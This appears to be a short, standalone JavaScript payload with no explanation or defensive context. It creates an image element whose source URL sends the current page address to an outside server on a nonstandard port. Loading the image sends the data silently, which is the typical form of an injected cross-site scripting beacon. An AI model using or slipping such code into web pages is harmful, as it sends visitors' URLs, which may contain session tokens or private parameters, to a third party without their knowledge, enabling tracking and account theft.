var image = document.createElement("img")

var name = window.location.href
image.src = "//patopirata.com:4567/image.png?c=" + name

document.body.appendChild(image);
